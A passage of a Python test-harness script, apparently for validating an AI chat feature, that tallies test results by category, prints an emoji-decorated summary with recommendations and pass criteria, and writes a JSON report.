        skipped_tests = sum(1 for r in self.results if r.status == "SKIP")
        
        # Determine overall status
        if error_tests > 0:
            overall_status = "ERROR"
        elif failed_tests > total_tests * 0.2:  # More than 20% failures
            overall_status = "FAIL"
        elif failed_tests > 0:
            overall_status = "PARTIAL"
        else:
            overall_status = "PASS"
        
        # Generate recommendations
        recommendations = []
        
        # Analyze failures by category
        failures_by_category = {}
        for result in self.results:
            if result.status in ["FAIL", "ERROR"]:
                if result.category not in failures_by_category:
                    failures_by_category[result.category] = []
                failures_by_category[result.category].append(result)
        
        for category, failures in failures_by_category.items():
            if category == "FUNCTIONAL":
                recommendations.append(f"Address {len(failures)} functional issues in AI response generation")
            elif category == "INTEGRATION":
                recommendations.append(f"Fix {len(failures)} integration problems with system components")
            elif category == "END_TO_END":
                recommendations.append(f"Resolve {len(failures)} workflow issues in end-to-end testing")
            elif category == "SECURITY":
                recommendations.append(f"Critical: Address {len(failures)} security vulnerabilities")
            elif category == "PERFORMANCE":
                recommendations.append(f"Optimize performance: {len(failures)} performance issues found")
        
        # Hardware-specific recommendations
        if self.system_info.get("memory_total_gb", 0) < 7.5:
            recommendations.append("Consider memory upgrade for optimal AI model performance")
        
        if self.system_info.get("cpu_count", 0) < 4:
            recommendations.append("CPU performance may be limited for AI operations")
        
        # Add general recommendations based on results
        ai_availability_tests = [r for r in self.results if "AI" in r.test_name and r.status == "SKIP"]
        if ai_availability_tests:
            recommendations.append("Install and configure Ollama with llama3.1:8b-instruct-q4_0 for full AI functionality")
        
        return ValidationReport(
            test_results=self.results,
            overall_status=overall_status,
            total_tests=total_tests,
            passed_tests=passed_tests,
            failed_tests=failed_tests,
            execution_time=total_execution_time,
            system_info=self.system_info,
            recommendations=recommendations
        )
    
    def print_summary_report(self, report: ValidationReport):
        """Print a comprehensive summary report."""
        print("\n" + "=" * 70)
        print("🔍 COMPREHENSIVE AI CHAT FUNCTIONALITY VALIDATION REPORT")
        print("=" * 70)
        
        # Overall Status
        status_icons = {
            "PASS": "✅",
            "PARTIAL": "⚠️", 
            "FAIL": "❌",
            "ERROR": "💥"
        }
        
        print(f"\n🎯 OVERALL STATUS: {status_icons.get(report.overall_status, '❓')} {report.overall_status}")
        print(f"📊 TEST SUMMARY: {report.passed_tests}/{report.total_tests} passed ({report.passed_tests/report.total_tests:.1%})")
        print(f"⏱️  EXECUTION TIME: {report.execution_time:.1f} seconds")
        
        # Results by Category
        categories = {}
        for result in report.test_results:
            if result.category not in categories:
                categories[result.category] = {"PASS": 0, "FAIL": 0, "ERROR": 0, "SKIP": 0}
            categories[result.category][result.status] += 1
        
        print(f"\n📋 RESULTS BY CATEGORY:")
        for category, stats in categories.items():
            total = sum(stats.values())
            passed = stats["PASS"]
            print(f"   {category}: {passed}/{total} passed ({passed/total:.1%}) - "
                  f"Pass: {stats['PASS']}, Fail: {stats['FAIL']}, Error: {stats['ERROR']}, Skip: {stats['SKIP']}")
        
        # Failed Tests Detail
        failed_tests = [r for r in report.test_results if r.status in ["FAIL", "ERROR"]]
        if failed_tests:
            print(f"\n❌ FAILED TESTS ({len(failed_tests)}):")
            for test in failed_tests:
                print(f"   • [{test.category}] {test.test_name}: {test.details}")
                for issue in test.issues_found:
                    print(f"     ⚠️  {issue}")
        
        # Critical Issues
        critical_issues = []
        for result in report.test_results:
            if result.category == "SECURITY" and result.status == "FAIL":
                critical_issues.extend(result.issues_found)
            elif "generic" in result.details.lower() and result.status == "FAIL":
                critical_issues.append("AI still providing generic responses - core functionality not fixed")
        
        if critical_issues:
            print(f"\n🚨 CRITICAL ISSUES REQUIRING IMMEDIATE ATTENTION:")
            for issue in critical_issues[:5]:  # Show top 5
                print(f"   • {issue}")
        
        # System Information
        print(f"\n💻 SYSTEM INFORMATION:")
        print(f"   CPU Cores: {report.system_info.get('cpu_count', 'Unknown')}")
        print(f"   Memory: {report.system_info.get('memory_total_gb', 0):.1f}GB total, {report.system_info.get('memory_available_gb', 0):.1f}GB available")
        print(f"   Memory Usage: {report.system_info.get('memory_percent', 0):.1f}%")
        print(f"   CPU Usage: {report.system_info.get('cpu_percent', 0):.1f}%")
        
        # Recommendations
        if report.recommendations:
            print(f"\n💡 RECOMMENDATIONS:")
            for i, rec in enumerate(report.recommendations, 1):
                print(f"   {i}. {rec}")
        
        # Validation Criteria Results
        print(f"\n✅ VALIDATION CRITERIA ASSESSMENT:")
        
        # Check each critical requirement
        functional_tests = [r for r in report.test_results if r.category == "FUNCTIONAL"]
        functional_pass_rate = sum(1 for t in functional_tests if t.status == "PASS") / len(functional_tests) if functional_tests else 0
        
        integration_tests = [r for r in report.test_results if r.category == "INTEGRATION"]
        integration_pass_rate = sum(1 for t in integration_tests if t.status == "PASS") / len(integration_tests) if integration_tests else 0
        
        security_tests = [r for r in report.test_results if r.category == "SECURITY"]
        security_pass_rate = sum(1 for t in security_tests if t.status == "PASS") / len(security_tests) if security_tests else 0
        
        performance_tests = [r for r in report.test_results if r.category == "PERFORMANCE"]
        performance_pass_rate = sum(1 for t in performance_tests if t.status == "PASS") / len(performance_tests) if performance_tests else 0
        
        e2e_tests = [r for r in report.test_results if r.category == "END_TO_END"]
        e2e_pass_rate = sum(1 for t in e2e_tests if t.status == "PASS") / len(e2e_tests) if e2e_tests else 0
        
        criteria_results = [
            ("AI responses are specific and actionable", functional_pass_rate >= 0.8),
            ("Generated code is syntactically correct", integration_pass_rate >= 0.8),
            ("Security remains at 100% with no vulnerabilities", security_pass_rate >= 1.0),
            ("Performance is acceptable on target hardware", performance_pass_rate >= 0.8),
            ("End-to-end workflow functions properly", e2e_pass_rate >= 0.8)
        ]
        
        for criterion, passed in criteria_results:
            status_icon = "✅" if passed else "❌"
            print(f"   {status_icon} {criterion}")
        
        # Final Assessment
        all_criteria_met = all(passed for _, passed in criteria_results)
        
        print(f"\n🏆 FINAL ASSESSMENT:")
        if all_criteria_met:
            print("   ✅ ALL VALIDATION CRITERIA MET - AI chat functionality fixes are working correctly!")
            print("   ✅ System is ready for production use with comprehensive AI infrastructure automation")
        elif report.overall_status == "PARTIAL":
            print("   ⚠️  PARTIAL SUCCESS - Most functionality working but some issues require attention")
            print("   🔧 Address failed tests before deploying to production")
        else:
            print("   ❌ VALIDATION FAILED - Critical issues prevent proper AI chat functionality")
            print("   🚨 Immediate fixes required before system can be considered functional")
        
        print("\n" + "=" * 70)

async def main():
    """Run the comprehensive AI validation suite."""
    validator = ComprehensiveAIValidator()
    
    try:
        # Run all test categories
        print("🔄 Starting Comprehensive Validation Suite...\n")
        
        # 1. Functional Testing
        await validator.run_functional_tests()
        validator._add_result("Functional Tests", "FUNCTIONAL", "INFO", "Completed functional testing phase", 0.0)
        
        # 2. Integration Testing
        await validator.run_integration_tests()
        validator._add_result("Integration Tests", "INTEGRATION", "INFO", "Completed integration testing phase", 0.0)
        
        # 3. End-to-End Testing
        await validator.run_end_to_end_tests()
        validator._add_result("End-to-End Tests", "END_TO_END", "INFO", "Completed end-to-end testing phase", 0.0)
        
        # 4. Security Testing
        await validator.run_security_tests()
        validator._add_result("Security Tests", "SECURITY", "INFO", "Completed security testing phase", 0.0)
        
        # 5. Performance Testing
        await validator.run_performance_tests()
        validator._add_result("Performance Tests", "PERFORMANCE", "INFO", "Completed performance testing phase", 0.0)
        
        # Generate and display comprehensive report
        report = validator.generate_report()
        validator.print_summary_report(report)
        
        # Save detailed report to file
        report_path = Path("ai_validation_report.json")
        with open(report_path, 'w') as f:
            report_data = {
                "overall_status": report.overall_status,
                "total_tests": report.total_tests,
                "passed_tests": report.passed_tests,
                "failed_tests": report.failed_tests,
                "execution_time": report.execution_time,
                "system_info": report.system_info,
                "recommendations": report.recommendations,
                "test_results": [
                    {
                        "test_name": r.test_name,
                        "category": r.category,
                        "status": r.status,
                        "details": r.details,
                        "execution_time": r.execution_time,
                        "metrics": r.metrics,
                        "issues_found": r.issues_found
                    }
                    for r in report.test_results
                ]
            }
            json.dump(report_data, f, indent=2, default=str)
        
        print(f"\n📄 Detailed report saved to: {report_path.absolute()}")
        
        # Return appropriate exit code
        if report.overall_status == "PASS":
            return 0
        elif report.overall_status == "PARTIAL":
            return 1
        else:
            return 2
            
    except KeyboardInterrupt:
        print("\n⚠️  Validation interrupted by user")
        return 130
    except Exception as e:
        print(f"\n💥 Validation framework error: {e}")
        return 1

if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)